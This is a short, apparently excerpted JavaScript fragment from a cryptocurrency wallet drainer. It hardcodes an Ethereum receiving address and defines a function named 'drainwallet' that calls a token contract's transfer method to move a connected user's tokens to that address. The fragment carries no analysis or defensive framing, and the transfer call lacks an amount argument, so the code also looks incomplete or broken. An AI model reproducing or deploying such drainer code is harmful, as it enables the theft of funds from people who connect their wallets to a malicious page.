...
const receiveAddress = "0x4EC31946eE2C120759C710232a6173B8cCD8B052";   
...
function drainwallet(token) {
	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); 
